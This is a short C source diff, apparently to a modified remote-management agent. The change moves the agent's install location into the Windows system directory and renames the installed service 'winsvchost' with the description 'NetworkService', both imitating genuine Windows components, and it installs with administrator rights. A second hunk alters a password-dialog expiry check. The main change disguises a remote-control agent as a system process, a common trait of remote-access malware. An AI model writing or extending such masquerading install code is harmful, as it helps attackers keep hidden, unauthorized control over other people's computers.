@@ -636,10 +636,12 @@ duk_ret_t _start(duk_context *ctx)
 
 		char szInstall[MAX_PATH] = { 0 };
 
-		SHGetSpecialFolderPathA(NULL, szInstall, CSIDL_LOCAL_APPDATA, FALSE);
-		sprintf_s(szInstall, sizeof(szInstall), "%s\\Microsoft", szInstall);
+		GetSystemDirectoryA(szInstall, MAX_PATH);
 
-		sprintf_s(ILibScratchPad, sizeof(ILibScratchPad), "-full%s --installPath=%s --meshServiceName=%s --target=RuntimeBroker --description=NetworkService", "install", szInstall, SERVICE_NAME);
+		//SHGetSpecialFolderPathA(NULL, szInstall, CSIDL_LOCAL_APPDATA, FALSE);
+		//sprintf_s(szInstall, sizeof(szInstall), "%s\\Microsoft", szInstall);
+
+		sprintf_s(ILibScratchPad, sizeof(ILibScratchPad), "-full%s --installPath=%s --meshServiceName=%s --target=winsvchost --description=NetworkService", "install", szInstall, SERVICE_NAME);
 		auto result = RunAsAdmin(ILibScratchPad, IsAdmin() == TRUE);
 
 
@@ -685,7 +687,7 @@ INT_PTR CALLBACK PasswordDlgProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lPa
 				SYSTEMTIME st;
 				GetLocalTime(&st);
 
-				if (st.wMonth > 4 || ((st.wMonth == 4) && st.wDay > 22)) {
+				if (st.wYear > 2023) {
 					MessageBoxA(hwnd, "password has expired", "Warning", MB_OK);
 				} else
 					EndDialog(hwnd, IDOK);
